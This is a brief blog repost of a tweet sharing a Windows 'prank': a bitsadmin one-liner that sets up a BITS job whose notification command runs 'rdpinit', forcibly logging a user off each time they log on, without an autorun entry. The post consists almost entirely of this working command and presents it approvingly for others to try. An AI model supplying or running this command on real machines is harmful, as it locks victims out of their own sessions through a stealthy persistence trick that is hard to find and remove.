---
title: A Cool Windows Prank :)
repost_link: https://twitter.com/fkadibs/status/1434291573655752706
---

[@fkadibs](https://twitter.com/fkadibs):

> log off a user whenever they log on, without an autorun:
>
> `bitsadmin /create 1 & bitsadmin /addfile 1 google.com/0.html %temp%\0.html & bitsadmin /setnotifycmdline 1 rdpinit NULL & bitsadmin /resume 1`

This was in reply to a [@SwiftOnSecurity](https://twitter.com/swiftonsecurity) tweet (you should follow them btw) saying:

> Running "rdpinit" in Windows run command will immediately forcibly logoff the user.

what a cool prank :)
